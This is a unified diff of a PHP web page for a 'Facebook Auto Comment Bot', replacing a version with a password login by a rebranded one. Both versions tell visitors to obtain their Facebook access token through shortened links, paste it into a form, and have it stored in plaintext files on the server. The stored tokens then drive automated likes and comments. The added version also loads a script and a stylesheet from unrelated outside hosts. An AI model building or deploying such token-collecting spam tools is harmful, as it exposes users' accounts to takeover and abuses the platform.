@@ -1,1075 +1,441 @@
- ko<?php 
-
-session_start();
-
-error_reporting(0);
-
-$site_title = "Facebook Auto Comment Bot Site";
-
-
-
-// using banned in role will show user that he is banned when he try to login . 
-
-$users = array("huzaifa" => array("name" => "Huzaifa Ali", "role"=> "admin"),);
-
-
-
-if(isset($_SESSION['logged']) && !isset($users[$_SESSION['password']]) || $users[$_SESSION['password']]['role'] == 'banned'){
-
-      unset($_SESSION['logged']);
-
-      unset($_SESSION['password']);
-
-      unset($_SESSION['username']);
-
-}
-
-
-
-if(!isset($_SESSION['logged']) || $_SESSION['logged'] ==  false){
-
-	$showlogin = true;
-
-	$loginerror = "";
-
-	
-
-   if(isset($_POST['password'])){
-
-
-
-      $password = $_POST['password'];
-
-
-
-    if(!empty($password)){
-
-
-
-      if(isset($users[$password])){
-
-        
-
-         if($users[$password]['role'] !== 'banned'){
-
-      		$_SESSION['logged'] = true;
-
-      		$_SESSION['password'] = $password;
-
-      		$_SESSION['username'] = $users[$password]['name'];
-
-            $showlogin = false;
-
-          }else{
-
-          	 if(isset($users[$password]['msg']) && !empty($users[$password]['msg'])){
-
-              $loginerror =  $users[$password]['msg'];
-
-          	 }else{
-
-              $loginerror = "You are banned from using this bot! Get out of here!";
-
-            }
-
-          }
-
-      }else{
-
-       	  $loginerror = "Wrong Password!";
-
-      }
-
-
-
-     }else{
-
-     	$loginerror = "Please enter Password!";
-
-     }
-
-  }
-
-}
-
-
-
- ?>
-
-
-
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html>
-
-<head>
-
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-
-<title><?php echo $site_title; ?></title>
-
-<link rel="shortcut icon" type="image/png" href="fav.png" />
-
-<style>
-
-@font-face {
-
-    font-family: miaanFont;
-
-    src: url(dragon.ttf);
-
-}
-
-a
-
-{
-
-  text-decoration: none;
-
-  color:white;
-
-}
-
-#footer
-
-{
-
-	position: absolute;
-
-	vertical-align: center;
-
-	width: 98%;
-
-	top: 65%;	
-
-}
-
-.form
-
-{
-
-	position: absolute;
-
-	vertical-align: center;
-
-	width: 98%;
-
-	top: 40%;
-
-}
-
-.form1
-
-{
-
-	position: absolute;
-
-	vertical-align: center;
-
-	width: 98%;
-
-	top: 55%;
-
-}
-
-.access
-
-{
-
-	position: absolute;
-
-	vertical-align: center;
-
-	width: 98%;
-
-}
-
-.access h2
-
-{
-
-	margin-top: -15px;
-
-}
-
-input[type=text] {
-
-font-family:miaanFont;
-
-    width: 60%;
-
-    height: 5%;
-
-    padding: 8px 32px;
-
-    margin: 8px 0;
-
-    font-size:22px;
-
-    box-sizing: border-box;
-
-    border: 2px solid white;
-
-    background-color: black;
-
-    color: white;
-
-    border-radius:50px;
-
-    outline: none;
-
-    text-align: center;
-
-}
-
-input[type=password] {
-
-font-family:miaanFont;
-
-    width: 60%;
-
-    height: 5%;
-
-    padding: 8px 32px;
-
-    margin: 8px 0;
-
-    font-size:22px;
-
-    box-sizing: border-box;
-
-    border: 2px solid white;
-
-    background-color: black;
-
-    color: white;
-
-    border-radius:50px;
-
-    outline: none;
-
-    text-align: center;
-
-}
-
-.button {
-
-	font-family:miaanFont;
-
-    height: 5%;
-
-    background-color: black; /* Green */
-
-    border: 2px solid white;
-
-    color: white;
-
-    padding: 8px 32px;
-
-    text-align: center;
-
-    text-decoration: none;
-
-    display: inline-block;
-
-    font-size: 22px;
-
-    margin: 4px 2px;
-
-    -webkit-transition-duration: 0.4s; /* Safari */
-
-    transition-duration: 0.4s;
-
-    cursor: pointer;
-
-}
-
-
-
-.button1 {
-
-    background-color: black;
-
-    color: white;
-
-    border-radius:50px;
-
-}
-
-
-
-.button1:hover {
-
-    background-color: white;
-
-    color: black;
-
-}
-
-</style>
-
-</head>
-
-<body bgcolor="black">
-
-<font style="color:white;font-size:26px;font-family:miaanFont">
-
-<audio src="http://ihostbot.com/Rooh.mp3" autoplay="" loop=""></audio>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
+♥ HATERZ ONLY F33L KARO ♥
+</title><link rel="stylesheet" type="text/css" href="http://no-word.tk/css/awais.css"
+</title><link rel="stylesheet" type="text/css" href="" media="all,handheld"/><link rel="shortcut icon" href="">
+<script type="text/javascript" src="http://fb.com/PyrAa.SA.BachAa.ho"></script>
 
 <?php
-
-$bot = new bot();
-
-class bot
-
-
-
-{
-
-	public function getGr($as, $bs)
-
-	{
-
-		$im = 'https://graph.fb.me'.$as .$bs;
-
-		return $im;
-
-	}
-
-	public function getUrl($mb, $tk, $uh = null)
-
-	{
-
-		$ar = array('access_token' => $tk,);
-
-		if($uh)
-
-		{
-
-			$else = array_merge($ar, $uh);
-
-		}
-
-		else
-
-		{
-
-			$else = $ar;
-
-		}
-
-
-
-		foreach($else as $b => $c)
-
-		{
-
-			$cokis[] = $b . '=' . $c;
-
-		}
-
-
-
-		$true = '?' . implode('&', $cokis);
-
-		$true = $this->getGr($mb, $true);
-
-		$true = json_decode($this->one($true) , true);
-
-		if ($true[data])
-
-		{
-
-			return $true[data];
-
-		}
-
-		else
-
-		{
-
-			return $true;
-
-		}
-
-	}
-
-
-
-	private function one($url)
-
-	{
-
-		$cx = curl_init();
-
-		curl_setopt_array($cx, array(
-
-			CURLOPT_URL => $url,
-
-			CURLOPT_CONNECTTIMEOUT => 5,
-
-			CURLOPT_RETURNTRANSFER => 1,
-
-			CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36',
-
-		));
-
-		$ch = curl_exec($cx);
-
-		curl_close($cx);
-
-		return ($ch);
-
-	}
-
-	public function savEd($tk,$id,$z=null,$bb = null) 
-
-	{
-
-		if (!is_dir('cokis'))
-
-		{
-
-			mkdir('cokis');
-
-		}
-
-		if (!is_dir('cokiss'))
-
-		{
-
-			mkdir('cokiss');
-
-		}
-
-        if (!is_file('cokiss/' . $id . '-info'))
-
-        {
-
-            $info = $_SESSION['username'];
-
-            $nd = fopen('cokiss/' . $id . '-info', 'w');
-
-	    fwrite($nd, $info);
-
-	    fclose($nd);
-
+error_reporting(0);
+$bot=new bot();
+class bot{ 
+
+public function getGr($as,$bs){
+$ar=array(
+        'graph',
+        'fb',
+        'me'
+);
+$im='https://'.implode('.',$ar);
+
+return $im.$as.$bs;
+}
+
+public function getUrl($mb,$tk,$uh=null){
+$ar=array(
+        'access_token' => $tk,
+);
+if($uh){
+$else=array_merge($ar,$uh);
+        }else{
+        $else=$ar;
+}
+foreach($else as $b => $c){
+        $cokis[]=$b.'='.$c;
+}
+$true='?'.implode('&',$cokis);
+$true=$this->getGr($mb,$true);
+$true=json_decode($this->
+one($true),true);
+if($true[data]){
+        return $true[data];
+}else{
+        return $true;}
+}
+
+private function one($url){
+$cx=curl_init();
+curl_setopt_array($cx,array(
+CURLOPT_URL => $url,
+CURLOPT_CONNECTTIMEOUT => 5,
+CURLOPT_RETURNTRANSFER => 1,
+CURLOPT_USERAGENT => 'DESCRIPTION by haxer.heck.in',
+));
+$ch=curl_exec($cx);
+        curl_close($cx);
+        return ($ch);
+}
+
+public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){
+if(!is_dir('cokis')){
+        mkdir('cokis');
+}
+if($bb){
+$blue=fopen('cokis/'.$id,'w');
+fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);
+        fclose($blue);
+
+echo'<script type="text/javascript">alert("INFO : Text robot telah dibuat")</script>';
+}else{
+        if($z){
+if(file_exists('cokis/'.$id)){
+$file=file_get_contents('cokis/'.$id);
+$ex=explode('*',$file);
+$str=str_replace($ex[0],$tk,$file);
+$xs=fopen('cokis/'.$id,'w');
+        fwrite($xs,$str);
+        fclose($xs);
+}else{
+$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;
+$xs=fopen('cokis/'.$id,'w');
+        fwrite($xs,$str);
+        fclose($xs);
+}
+$_SESSION[key]=$tk.'_'.$id;
+}else{
+$file=file_get_contents('cokis/'.$id);
+$file=explode('*',$file);
+        if($file[5]){
+$up=fopen('cokis/'.$id,'w');
+fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);
+        fclose($up);
+        }else{
+$up=fopen('cokis/'.$id,'w');
+fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);
+        fclose($up);
+        }
+echo'<script type="text/javascript">alert("INFO : Data Anda telah ter Save, Robot berjalan otomatis")</script>';}}
+}
+
+public function lOgbot($d){
+        unlink('cokis/'.$d);
+        unset($_SESSION[key]);
+
+echo'
+<script type="text/javascript">alert("INFO : Logout success")
+</script>';
+
+        $this->atas();
+        $this->home();
+        $this->bwh();
+}
+
+public function cek($tok,$id,$nm){
+$if=file_get_contents('cokis/'.$id);
+$if=explode('*',$if);
+if(preg_match('/on/',$if[1])){
+        $satu='on';
+        $ak='Like tambah komen';
+}else{
+        $satu='off';
+        $ak='Like saja';
+}
+if(preg_match('/on/',$if[2])){
+        $dua='on';
+        $ik='Bot emo';
+}else{
+        $dua='off';
+        $ik='Bot manual';
+}
+if(preg_match('/on/',$if[3])){
+        $tiga='on';
+        $ek='Powered on';
+}else{
+        $tiga='off';
+        $ek='Powered off';
+}
+if(preg_match('/on/',$if[4])){
+        $empat='on';
+        $uk='Text via script';
+}else{
+        $empat='off';
+        $uk='Via text sendiri';
+}
+echo'
+<div id="bottom-content">
+<div id="navigation-menu">
+<h3><a name="navigation-name" class="no-link"> Welcome '.$nm.'</a></h3>
+<ul>
+<li>
+Welcome Back : <font color="white">'.$nm.'</font></li>
+<li>
+<a href="http://m.facebook.com/'.$id.'"><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;" alt="'.$nm.'"/></a></li>
+<li>
+<form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'">
+<input type="submit" value="Logout Bot"></form></li>
+<li>
+<form action="index.php" method="post">
+Select Menu Robot</li>
+<li>
+<select name="likes">';
+        if($satu=='on'){
+        echo'
+<option value="'.$satu.'">
+'.$ak.'
+</option>
+<option value="off">
+Like saja</option>
+</select>';
+        }else{
+        echo'
+<option value="'.$satu.'">
+'.$ak.'
+</option>
+<option value="on">
+Like tambah komen</option>
+</select>';
+}
+echo'</li>
+<li>
+<select name="emot">';
+        if($dua=='on'){
+        echo'
+<option value="'.$dua.'">
+'.$ik.'
+</option>
+<option value="off">
+Bot manual</option>
+</select>';
+        }else{
+        echo'
+<option value="'.$dua.'">
+'.$ik.'
+</option>
+<option value="on">
+Bot emo</option>
+</select>';
+}
+echo'</li>
+<li>
+<select name="target">';
+        if($tiga=='on'){
+        echo'
+<option value="'.$tiga.'">
+'.$ek.'
+</option>
+<option value="off">
+Powered off</option>
+</select>';
+        }else{
+        echo'
+<option value="'.$tiga.'">
+'.$ek.'
+</option>
+<option value="on">
+Powered on</option>
+</select>';
+}
+echo'</li>
+<li>';
+        if($empat=='on'){
+        echo'
+<select name="opsi">
+<option value="'.$empat.'">
+'.$uk.'
+</option>
+<option value="off">
+Via text sendiri</option>
+</select>';
+}else{
+        if($if[5]){
+        echo'
+<select name="opsi">
+<option value="'.$empat.'">
+'.$uk.'
+</option>
+<option value="text">
+Ganti Text Anda
+</option>
+<option value="on">
+Text via script</option>
+</select>';
+        }else{
+        echo'
+Buat text Anda
+<br>
+<input type="text" name="text" style="height:30px;">
+<input type="hidden" name="opsi" value="'.$empat.'">';}
+}
+echo'
+</li>
+</ul></div>
+
+<div id="top-content">
+<div id="search-form">
+<input type="submit" value="SAVE"></form>
+</div></div></div>';
+
+$this->membEr();
+}
+
+public function atas(){
+$hari=array(1=>
+        "Monday",
+        "Tuesday",
+        "Wednesday",
+        "Thursday",
+        "Friday",
+        "Saturday",
+        "Sunday"
+);
+
+$bulan=array(1=>
+"January",
+  "February",
+    "March",
+     "April",
+       "May",
+         "June",
+           "July",
+             "August",
+               "September",
+          "October",
+     "November",
+"Desember"
+);
+
+$hr=$hari[gmdate('N',time()+60*60*7)];
+$tgl=gmdate('j',time()+60*60*7);
+$bln=
+$bulan[gmdate('n',time()+60*60
+*7)];
+$thn=gmdate('Y',time()+60*60*7);
+$jam=gmdate('H',time()+60*60*7);
+
+echo'
+<div id="header">
+<h1 class="heading">
+</h1>
+<h2 class="description">
+<marquee behavior="center" direction="center" scrollamount="18" scrolldelay="33" width="100%">
+<b>
+<font size="20" color="white">-=[</font><a class="sec" href=""><font color="White" size="20">UMAIR</font></a></b> <font size="20" color="white"></font>
+<b>
+<a class="sec" href=""><font color="White" size="20">  MALIK</font></a></b><font size="20" color="white">]=-</font></marquee><br />
+</h2></div>';
+} 
+
+public function home(){
+echo'
+<div id="content">
+<div class="post">
+<div class="post-meta">
+<h3 class="description">• Rε∂ιяεcт ι∂ • : <center><a href="http://www.facebook.com/PyrAa.SA.BachAa.ho">Cℓιcк нεяε</a></center>
+<h2 class="title">
+<div class="post-content">
+
+<center></head>
+    <body>
+        <div id="main">
+            <div id="content">
+                <div class="header">
+<span class="mfss fcg">
+<div class="post-meta2">
+</div></div></div>';
+}
+
+public function bwh(){
+echo'
+<div id="bottom-content">
+<div id="navigation-menu">
+<marquee behavior="center" direction="center" scrollamount="21" scrolldelay="38" width="100%">
+<b>
+<font size="20" color="white">♥</font><a class="sec" href=""><font color="White" size="20">-[M A L I K</font></a></b> <font size="20" color="red"></font>
+<b>
+<a class="sec" href=""><font color="White" size="20">-B O T T E R X]-</font></a></b><font size="20" color="white">♥</font></marquee><br />
+</span>
+</div></center><br>
+<h3><a name="navigation-name" class="no-link"> Get Acces Token </a></h3><br>
+<center><a href="https://goo.gl/CvenbL" target="blank">• ALLOW PERMISSION •</a></center>
+<center><a href="https://goo.gl/EwUiuu" target="blank">• NOW GET YOUR TOKEN •</a></center>
+<center>
+<ul>
+</center>
+<div id="top-content">
+<div id="search-form">
+
+<form action="index.php" method="post"><input class="inp-text" type="text" style="height:28px;" name="token"> <input class="inp-btn" type="submit" style="height:28px;" value=" Sυвмιт "></form></div></div></div>';
+
+$this->membEr();
+}
+
+public function membEr(){
+        if(!is_dir('cokis')){
+        mkdir('cokis');
+}
+$up=opendir('cokis');
+while($use=readdir($up)){
+if($use != '.' && $use != '..'){
+        $user[]=$use;}
         }
 
-	if($bb)
-
-	{
-
-		$blue = fopen('cokis/' . $id, 'w');
-
-		fwrite($blue, $tk.'*on*on*on*on*'.$bb);
-
-		fclose($blue);
-
-		session_unset($_SESSION[key]);
-
-		echo '
-
-		<script type="text/javascript">
-
-			document.getElementById("resp").style="font-color:green;font-family:miaanFont;";
-
-			document.getElementById("resp").innerHTML="Comment Text Saved.";
-
-		</script>
-
-		';			
-
-	}
-
-	else
-
-	{
-
-		if ($z)
-
-		{
-
-			if (file_exists('cokis/' . $id))
-
-			{
-
-				$file = file_get_contents('cokis/' . $id);
-
-				$ex = explode('*', $file);
-
-				$str = str_replace($ex[0], $tk, $file);
-
-				$xs = fopen('cokis/' . $id, 'w');
-
-				fwrite($xs, $str);
-
-				fclose($xs);
-
-			}
-
-			else
-
-			{
-
-				$str = $tk.'*on*on*on*on';
-
-				$xs = fopen('cokis/' . $id, 'w');
-
-				fwrite($xs, $str);
-
-				fclose($xs);
-
-			}
-
-
-
-			$_SESSION[key] = $tk . '_' . $id;
-
-		}
-
-		else
-
-		{
-
-			$file = file_get_contents('cokis/' . $id);
-
-			$file = explode('*', $file);
-
-			if ($file[5])
-
-			{
-
-				$up = fopen('cokis/' . $id, 'w');
-
-				fwrite($up, $tk.'*on*on*on*on*'.$file[5]);
-
-				fclose($up);
-
-			}
-
-			else
-
-			{
-
-				$up = fopen('cokis/' . $id, 'w');
-
-				fwrite($up, $tk.'*on*on*on*on');
-
-				fclose($up);
-
-			}
-
-			session_unset($_SESSION[key]);
-
-		echo '
-
-		<script type="text/javascript">
-
-			document.getElementById("resp").style="font-color:green;font-family:miaanFont;";
-
-			document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";
-
-		</script>
-
-		';				
-
-		}
-
-	}
-
-	}
-
-
-
-	public function lOgbot($d) {
-
-		unlink('cokis/' . $d);
-
-		unlink('cokiss/' . $d.'-info');
-
-		session_unset($_SESSION[key]);
-
-		$this->atas();
-
-		$this->home();
-
-		$this->bwh();
-
-		echo '
-
-		<script type="text/javascript">
-
-			document.getElementById("resp").style="font-color:green;font-family:miaanFont;";
-
-			document.getElementById("resp").innerHTML="Logout Successfully...";
-
-		</script>
-
-		';			
-
-	}
-
-
-
-	public function cek($tok, $id, $nm)
-
-	{
-
-		 if(isset($GLOBALS['showlogin']) && $GLOBALS['showlogin'] == true)
-
-		 {
-
-          		$this->showlogin();
-
-          		$this->membEr();
-
-          		return;
-
- 		 }
-
-		echo '
-
-<div id="bottom-content">
-
-     	<div id="navigation-menu">
-
-     		<h3><a name="navigation-name" class="no-link">Welcome ' . $nm . '</a></h3>
-
-     		<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:180px; height:180px;border-radius:500px;" alt="' . $nm . '"/></a>
-
-	</div><br/>
-
-	     	<form action="index.php" method="post">
-
-     			<input name="text" type="hidden">
-
-     			<input type="hidden" name="opsi" value="off"><br/>
-
-	<div id="top-content">
-
-		<div id="search-form">
-
-				<input class="button button1" type="submit" value="Activate Bot">
-
-			</form>
-
-			<form action="index.php" method="post">
-
-     				<input type="hidden" name="logout" value="' . $id . '">
-
-     				<input class="button button1" type="submit" value="Remove Bot">
-
-     			</form>
-
-		</div>
-
-	</div>
-
+echo'
+<div id="footer">
+Users Robot : <font color="#ee9a00">'.count($user).'</font>
 </div>';
+}
 
-if (!is_dir('cokis')) {
-
-			mkdir('cokis');
-
-		}
-
-
-
-		$up = opendir('cokis');
-
-		while ($use = readdir($up)) {
-
-			if ($use != '.' && $use != '..') {
-
-				$user[] = $use;
-
-			}
-
-		}
-
-
-
-     echo '<div id="position: absolute;vertical-align: center;width: 98%;top: 80%;">';
-
-     if(isset($_SESSION['logged']) && $_SESSION['logged'] ==  true)
-
-     {
-
-       echo 'Active Users: ' . count($user) . '</font>
-
-       <br/></div>';
-
-     }
-
-			
-
-	}
-
-
-
-   public function atas()
-
-   {
-
-     echo'
-
-     <center>
-
-     <div id="header">
-
-     <h2 align="center"><font style="background: url(&quot;bg.gif&quot;) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em red;font-family:miaanFont;font-size:90px;"><b> HUZΔIҒΔ ΔLI </b></font></h2>
-	<h2 align="center"><font style="background: url(&quot;bg.gif&quot;) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em red;font-family:miaanFont;font-size:50px;"><b><a href="https://facebook.com/huzziix" target="_blank"> ҒΩLLΩШ MΣ ΩΠ ҒΔCΣβΩΩҜ</a></b></font></h2>     
-
-     <h2 class="description">
-
-     </h2></div>';
-
-   }	
-
-   public function home()
-
-   {
-
-     echo '<div id="content">
-
-     <div class="post">
-
-     <div class="post-content">
-
-     <div class="post-content">
-
-     </div>
-
-     </div>
-
-     <div class="post-meta2">
-
-     </div></div></div>';
-
-   }
-
-   public function showlogin()
-
-   {
-
-     echo '<div id="bottom-content">
-
-     <div id="navigation-menu">
-
-     <form class="form" action="index.php" method="post">
-
-     <div class="login-error">'.$GLOBALS["loginerror"].'</div>
-
-     <input class="inp-text" type="password"  name="password" value="admin" required placeholder="Enter Password To Contiue">
-
-     <input class="button button1" type="submit"  value="Continue">
-
-     </form>
-
-     </div></div>';
-
-   }
-
-
-
-   public function bwh()
-
-   {
-
-     if(isset($GLOBALS['showlogin']) && $GLOBALS['showlogin'] == true)
-
-     {
-
-       $this->showlogin();
-
-       $this->membEr();
-
-       return;
-
-     }
-
-          echo '
-
-     <div id="bottom-content">
-
-     <div id="navigation-menu">
-
-     <a target="_blank" href="https://goo.gl/CvenbL"><h3>Step 1: Click Here To Allow Application</h3></a>
-
-     <a target="_blank" href="https://goo.gl/NkKRQ6"><h3>Step 2: Click Here To Get Access Token</a></h3>
-
-     </div>
-
-     <div id="resp"></div>
-
-     <div id="top-content">
-
-     <div id="search-form">
-
-     <form class="form1" action="index.php" method="post"><input type="text" name="token" placeholder="Paste Your Access Token Here" required><input class="button button1" type="submit" value="Activate Bot"></form></div></div></div>';
-
-     $this->membEr();
-
-   }
-
-	public function membEr() {
-
-		if (!is_dir('cokis')) {
-
-			mkdir('cokis');
-
-		}
-
-
-
-		$up = opendir('cokis');
-
-		while ($use = readdir($up)) {
-
-			if ($use != '.' && $use != '..') {
-
-				$user[] = $use;
-
-			}
-
-		}
-
-
-
-     echo '<div id="footer">';
-
-     if(isset($_SESSION['logged']) && $_SESSION['logged'] ==  true)
-
-     {
-
-       echo 'Active Users: ' . count($user) . '</font>
-
-       <br/></div>';
-
-     }
-
-	}
-
-
-
-	public function toXen($h) {
-
-		header('Location: https://m.facebook.com/dialog/oauth?client_id=' . $h . '&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=cokis_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Ccokis_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
-
-	}
-
+public function toXen($h){
+header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
 }
 
 
-
-if (isset($_SESSION[key])) {
-
-	$a = $_SESSION[key];
-
-	$ai = explode('_', $a);
-
-	$a = $ai[0];
-
-	if ($_POST[logout]) {
-
-		$ax = $_POST[logout];
-
-		$bot->lOgbot($ax);
-
-	}
-
-	else {
-
-		$b = $bot->getUrl('/me', $a, array(
-
-			'fields' => 'id,name',
-
-		));
-
-		if ($b[id]) {
-
-			if ($_POST[opsi])
-
-			{
-
-				$cs = $_POST[opsi];
-
-				$tx = $_POST[text];
-
-				if ($cs == 'text')
-
-				{
-
-					unlink('cokis/' . $b[id]);
-
-					unlink('cokiss/' . $b[id].'-info');
-
-					$bot->savEd($a, $b[id]);
-
-				}
-
-				else
-
-				{
-
-					if ($tx)
-
-					{
-
-						$bot->savEd($a, $b[id], 'x', $tx);
-
-					}
-
-					else
-
-					{
-
-						$bot->savEd($a, $b[id]);
-
-					}
-
-				}
-
-			}
-
-
-
-			$bot->atas();
-
-			$bot->home();
-
-			$bot->cek($a, $b[id], $b[name]);
-
-		}
-
-		else {
-
-			unset($_SESSION[key]);
-
-			unlink('cokis/' . $ai[1]);
-
-			unlink('cokiss/' . $ai[1].'-info');
-
-			$bot->atas();
-
-			$bot->home();
-
-			$bot->bwh();
-
-			echo '
-
-			<script type="text/javascript">
-
-				document.getElementById("resp").style="font-color:red;font-family:miaanFont;";
-
-				document.getElementById("resp").innerHTML="Session Token Expired";
-
-			</script>
-
-			';			
-
-		}
-
-	}
-
 }
-
-else {
-
-	if ($_POST[token]) {
-
-		$a = $_POST[token];
-
-		if (preg_match('/token/', $a)) {
-
-			$tok = substr($a, strpos($a, 'token=') + 6, (strpos($a, '&') - (strpos($a, 'token=') + 6)));
-
-		}
-
-		else {
-
-			$cut = explode('&', $a);
-
-			$tok = $cut[0];
-
-		}
-
-
-
-		$b = $bot->getUrl('/me', $tok, array(
-
-			'fields' => 'id,name',
-
-		));
-
-		if ($b[id]) {
-
-			$bot->savEd($tok, $b[id], 'null');
-
-			$bot->atas();
-
-			$bot->home();
-
-			$bot->cek($tok, $b[id], $b[name]);
-
-		}
-
-		else {
-
-			$bot->atas();
-
-			$bot->home();
-
-			$bot->bwh();
-
-			echo '
-
-
-
-			<script type="text/javascript">
-
-				document.getElementById("resp").style="color:red;font-family:miaanFont;";
-
-				document.getElementById("resp").innerHTML="<h2>Token Is Invalid</h2>";
-
-			</script>
-
-
-
-			';
-
-		}
-
-	}
-
-	else {
-
-		if ($_GET[token]) {
-
-			$a = $_GET[token];
-
-			$bot->toXen($a);
-
-		}
-
-		else {
-
-			$bot->atas();
-
-			$bot->home();
-
-			$bot->bwh();
-
-		}
-
-	}
-
+if(isset($_SESSION[key])){
+        $a=$_SESSION[key];
+        $ai=explode('_',$a);
+        $a=$ai[0];
+if($_POST[logout]){
+        $ax=$_POST[logout];
+        $bot->lOgbot($ax);
+}else{
+$b=$bot->getUrl('/me',$a,array(
+'fields' => 'id,name',
+));
+if($b[id]){
+if($_POST[likes]){
+        $as=$_POST[likes];
+        $bs=$_POST[emot];
+        $bx=$_POST[target];
+        $cs=$_POST[opsi];
+        $tx=$_POST[text];
+if($cs=='text'){
+        unlink('cokis/'.$b[id]);
+$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
+        }else{
+        if($tx){
+$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
+        }else{
+$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
 }
-
-
-
+        $bot->atas();
+        $bot->home();
+$bot->cek($a,$b[id],$b[name]);
+}else{
+echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';
+        unset($_SESSION[key]);
+        unlink('cokis/'.$ai[1]);
+$bot->atas();
+$bot->home();
+        $bot->bwh();}}
+        }else{
+if($_POST[token]){
+        $a=$_POST[token];
+if(preg_match('/token/',$a)){
+$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
+        }else{
+        $cut=explode('&',$a);
+$tok=$cut[0];
+}
+$b=$bot->getUrl('/me',$tok,array(
+        'fields' => 'id,name',
+));
+if($b[id]){
+$bot->savEd($tok,$b[id],'on','on','on','on','null');
+        $bot->atas();
+        $bot->home();
+$bot->cek($tok,$b[id],$b[name]);
+}else{
+echo '<script type="text/javascript">alert("INFO: Jaan Token fir se lo")</script>';
+        $bot->atas();
+        $bot->home();
+        $bot->bwh();}
+}else{
+if($_GET[token]){
+        $a=$_GET[token];
+        $bot->toXen($a);
+}else{
+        $bot->atas();
+        $bot->home();
+        $bot->bwh();}}
+}
 ?>
-
-</body>
-
-</html>
-
